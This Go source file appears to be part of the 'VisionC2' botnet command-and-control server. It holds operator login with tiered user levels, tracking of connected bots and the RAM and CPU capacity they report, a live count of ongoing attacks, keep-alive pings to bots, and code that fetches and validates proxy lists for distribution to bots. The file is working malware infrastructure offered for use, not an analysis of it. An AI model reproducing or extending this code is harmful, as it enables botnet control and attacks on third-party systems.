package main

import (
	"bufio"
	"crypto/rand"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

type level int

const (
	Owner level = iota
	Admin
	Pro
	Basic
)

func (user *User) GetLevel() level {
	switch user.Level {
	case "Owner":
		return Owner
	case "Admin":
		return Admin
	case "Pro":
		return Pro
	case "Basic":
		return Basic
	default:
		return Basic // Default level
	}
}

type User struct {
	Username string    `json:"username,omitempty"`
	Password string    `json:"password,omitempty"`
	Expire   time.Time `json:"expire"`
	Level    string    `json:"level"` // Handle level as a string
}

func AuthUser(username string, password string) (bool, *User) {
	users := []User{}
	usersFile, err := os.ReadFile("users.json")
	if err != nil {
		return false, nil
	}
	json.Unmarshal(usersFile, &users)
	for _, user := range users {
		if user.Username == username && user.Password == password {
			if user.Expire.After(time.Now()) {
				return true, &user
			}
		}
	}
	return false, nil
}

func getConsoleTitleAnsi(title string) string {
	return "\u001B]0;" + title + "\a"
}

func (c *client) setConsoleTitle(title string) {
	c.conn.Write([]byte(getConsoleTitleAnsi(title)))
}

func setTitle(conn net.Conn, title string) {
	// Send the escape sequence to set the window title
	titleSequence := fmt.Sprintf("\033]0;%s\007", title)
	conn.Write([]byte(titleSequence))
}

const letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

func randomString(n int) (string, error) {
	b := make([]byte, n)
	if _, err := rand.Read(b); err != nil {
		return "", err // return an error if reading fails
	}

	for i := range b {
		b[i] = letterBytes[b[i]%byte(len(letterBytes))]
	}

	return string(b), nil
}

// getLevelString converts the numeric permission level to human-readable string
// Returns: "Owner", "Admin", "Pro", "Basic", or "Unknown"
func (c *client) getLevelString() string {
	level := c.user.GetLevel()
	switch level {
	case Owner:
		return "Owner"
	case Admin:
		return "Admin"
	case Pro:
		return "Pro"
	case Basic:
		return "Basic"
	default:
		return "Unknown"
	}
}

// safeSubstring extracts a substring without risking index out of bounds panic
// Returns empty string if start is beyond string length
// Truncates at string end if requested length exceeds remaining chars
func safeSubstring(s string, start, length int) string {
	if start >= len(s) {
		return ""
	}
	end := start + length
	if end > len(s) {
		end = len(s)
	}
	return s[start:end]
}

// pingHandler sends periodic PING messages to keep bot connections alive
// Runs as a goroutine for each authenticated bot
// Sends PING every 30 seconds to verify bot is still responsive

func pingHandler(conn net.Conn, botID string, stop chan struct{}) {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			// Send PING, exit on error (connection dead)
			if _, err := conn.Write([]byte("PING\n")); err != nil {
				return
			}
		case <-stop:
			// Graceful shutdown requested
			return
		}
	}
}

// ============================================================================
// UI UPDATE FUNCTIONS
// Handle dynamic terminal title updates and statistics display.
// These run as background goroutines to keep user's terminal updated.
// ============================================================================

// updateTitle continuously updates the terminal title for connected users
// Shows live statistics: bot count, ongoing attacks, user info

func updateTitle() {
	for {
		for _, cl := range clients {
			go func(c *client) {
				spinChars := []rune{'∴', '∵'} // Spinning animation characters
				spinIndex := 0

				for {
					attackCount := len(ongoingAttacks)

					// Format title with live stats
					title := fmt.Sprintf("    [%c]  Servers: %d | Attacks: %d/%d | ℣ | User: %s [%s] [%c]",
						spinChars[spinIndex], getBotCount(), attackCount, maxAttacks, c.user.Username, c.getLevelString(), spinChars[spinIndex])
					setTitle(c.conn, title)
					spinIndex = (spinIndex + 1) % len(spinChars)
					time.Sleep(1 * time.Second)
				}
			}(cl)
		}
		time.Sleep(time.Second * 2)
	}
}

// getBotCount returns the number of authenticated bots currently connected
// Thread-safe: uses RLock for concurrent read access
// Only counts bots that have completed authentication handshake
// Used in title updates and statistics displays
func getBotCount() int {
	botConnsLock.RLock()
	defer botConnsLock.RUnlock()
	count := 0
	for _, botConn := range botConnections {
		if botConn.authenticated {
			count++
		}
	}
	return count
}

// getTotalRAM calculates total RAM across all authenticated bots (in MB)
// Thread-safe: uses RLock for concurrent read access
// Sums up RAM values reported by each bot during registration
// Used to display aggregate botnet capacity in banner/stats
func getTotalRAM() int64 {
	botConnsLock.RLock()
	defer botConnsLock.RUnlock()
	var totalRAM int64 = 0
	for _, botConn := range botConnections {
		if botConn.authenticated {
			totalRAM += botConn.ram
		}
	}
	return totalRAM
}

// getTotalCPU calculates total CPU cores across all authenticated bots
// Thread-safe: uses RLock for concurrent read access
// Sums up CPU core counts reported by each bot during registration
// Used to display aggregate botnet compute capacity in banner/stats
func getTotalCPU() int {
	botConnsLock.RLock()
	defer botConnsLock.RUnlock()
	var totalCPU int = 0
	for _, botConn := range botConnections {
		if botConn.authenticated {
			totalCPU += botConn.cpuCores
		}
	}
	return totalCPU
}

// formatRAM converts RAM from MB to human-readable string
// Automatically converts to GB for values >= 1024MB (1GB)
// Returns formatted string like "512MB" or "2.5GB"
// Makes large RAM values more readable in UI displays
func formatRAM(ramMB int64) string {
	if ramMB >= 1024 {
		return fmt.Sprintf("%.1fGB", float64(ramMB)/1024.0)
	}
	return fmt.Sprintf("%dMB", ramMB)
}

// getC2Uptime returns the C2 server uptime as a formatted string
// Calculates duration since c2StartTime was set in main()
// Returns human-readable format like "2d 4h 15m" or "45m 30s"
func getC2Uptime() string {
	uptime := time.Since(c2StartTime)
	days := int(uptime.Hours()) / 24
	hours := int(uptime.Hours()) % 24
	minutes := int(uptime.Minutes()) % 60
	seconds := int(uptime.Seconds()) % 60

	if days > 0 {
		return fmt.Sprintf("%dd %dh %dm", days, hours, minutes)
	} else if hours > 0 {
		return fmt.Sprintf("%dh %dm %ds", hours, minutes, seconds)
	} else if minutes > 0 {
		return fmt.Sprintf("%dm %ds", minutes, seconds)
	}
	return fmt.Sprintf("%ds", seconds)
}

// getArchMap returns a map of architecture -> count of connected bots
// Thread-safe: uses RLock for concurrent read access
// Used to display architecture distribution in status bar
func getArchMap() map[string]int {
	botConnsLock.RLock()
	defer botConnsLock.RUnlock()

	archMap := make(map[string]int)
	for _, botConn := range botConnections {
		if botConn.authenticated && botConn.arch != "" {
			archMap[botConn.arch]++
		}
	}
	return archMap
}

// getActiveAttackCount returns the number of currently active attacks
// Uses the ongoingAttacks map to track in-progress attacks
// Thread-safe read access for UI display
func getActiveAttackCount() int {
	return len(ongoingAttacks)
}

// showBanner displays the VisionC2 ASCII art banner with live statistics

func showBanner(conn net.Conn) {
	RenderMainBanner(conn)
}

// ============================================================================
// PROXY VALIDATION FUNCTIONS
// Validates proxy lists before distributing to bots.
// ============================================================================

// fetchProxies downloads and parses a proxy list from a URL.
// Supports formats: ip:port, user:pass@host:port, http://ip:port
func fetchProxies(proxyURL string) ([]string, error) {
	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Get(proxyURL)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("status: %d", resp.StatusCode)
	}

	var proxies []string
	scanner := bufio.NewScanner(resp.Body)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		if !strings.HasPrefix(line, "http://") && !strings.HasPrefix(line, "https://") {
			line = "http://" + line
		}
		if _, err := url.Parse(line); err != nil {
			continue
		}
		proxies = append(proxies, line)
	}
	return proxies, scanner.Err()
}

// validateSingleProxy tests if a proxy can reach httpbin.org
func validateSingleProxy(proxyAddr string) bool {
	proxyURL, err := url.Parse(proxyAddr)
	if err != nil {
		return false
	}

	transport := &http.Transport{
		Proxy: http.ProxyURL(proxyURL),
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
		DisableKeepAlives: true,
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   6 * time.Second,
	}

	resp, err := client.Get("http://httpbin.org/ip")
	if err != nil {
		return false
	}
	resp.Body.Close()
	return resp.StatusCode == http.StatusOK
}

// validateProxies tests all proxies in parallel and returns working ones
func validateProxies(proxies []string) []string {
	type result struct {
		proxy string
		valid bool
	}

	results := make(chan result, len(proxies))
	var wg sync.WaitGroup

	for _, proxy := range proxies {
		wg.Add(1)
		go func(p string) {
			defer wg.Done()
			results <- result{proxy: p, valid: validateSingleProxy(p)}
		}(proxy)
	}

	go func() {
		wg.Wait()
		close(results)
	}()

	var valid []string
	for r := range results {
		if r.valid {
			valid = append(valid, r.proxy)
		}
	}
	return valid
}

// findBotByID looks up a bot connection by ID (supports partial matching)
// Returns the first bot whose ID matches or starts with the given string
// Thread-safe with RLock for concurrent access
// Returns nil if no matching bot found
// Used to validate bot existence before sending targeted commands
func findBotByID(botID string) *BotConnection {
	botConnsLock.RLock()
	defer botConnsLock.RUnlock()

	for id, botConn := range botConnections {
		// Match exact ID or prefix for partial ID targeting
		if id == botID || strings.HasPrefix(id, botID) {
			return botConn
		}
	}
	return nil
}
